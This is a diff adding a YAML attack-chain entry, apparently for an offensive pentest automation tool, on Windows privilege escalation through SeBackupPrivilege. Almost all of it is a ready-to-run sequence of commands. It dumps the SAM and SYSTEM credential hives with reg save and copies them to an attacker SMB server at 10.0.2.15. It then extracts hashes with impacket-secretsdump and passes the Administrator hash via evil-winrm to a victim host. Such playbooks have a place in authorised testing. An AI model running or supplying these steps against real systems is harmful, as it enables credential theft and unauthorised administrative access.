@@ -1,0 +1,40 @@
+chain_id: sebackup_dcsync
+title: "Windows privesc — SeBackupPrivilege to dump SAM/SYSTEM"
+severity: CRITICAL
+tags: [windows, privesc, sebackup, sam, secretsdump]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeBackupPrivilege" }
+
+description: |
+  SeBackupPrivilege grants read access to any file on the volume regardless
+  of DACLs. The canonical move is to copy SAM and SYSTEM hives, then run
+  secretsdump locally to crack/PtH the local Administrator hash.
+
+steps:
+  - id: 1
+    title: "Copy SAM and SYSTEM via reg save (works as backup operator)"
+    command: |
+      reg save HKLM\SAM C:\Users\Public\sam.save
+      reg save HKLM\SYSTEM C:\Users\Public\system.save
+
+  - id: 2
+    title: "Exfiltrate to Kali"
+    command: |
+      # From Kali (with smbserver up):
+      impacket-smbserver share . -smb2support
+      # From Windows:
+      copy C:\Users\Public\sam.save \\10.0.2.15\share\
+      copy C:\Users\Public\system.save \\10.0.2.15\share\
+
+  - id: 3
+    title: "Dump local hashes with secretsdump"
+    command: impacket-secretsdump -sam sam.save -system system.save LOCAL
+
+  - id: 4
+    title: "Pass-the-Hash with the Administrator NT hash"
+    command: evil-winrm -i $VICTIMA -u Administrator -H <NThash>
+
+references:
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/sebackupprivilege
